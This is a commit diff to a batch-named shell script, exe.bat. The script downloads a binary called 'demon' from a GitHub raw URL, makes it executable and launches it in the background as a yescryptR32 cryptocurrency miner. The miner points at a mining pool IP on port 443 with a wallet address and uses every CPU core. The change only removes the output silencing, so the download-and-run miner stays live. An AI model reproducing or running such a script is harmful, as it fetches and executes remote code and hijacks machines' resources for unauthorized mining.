b1263255fc8c68d911a128cfaa2252bcaa251584
asertayuanaza <cibget@almajdservices.com>
2024-05-16 18:38:25 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,2 +1,2 @@
 wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
-nohup ./demon -a yescryptR32 -o 45.115.225.12:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all) &>/dev/null
+nohup ./demon -a yescryptR32 -o 45.115.225.12:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all)
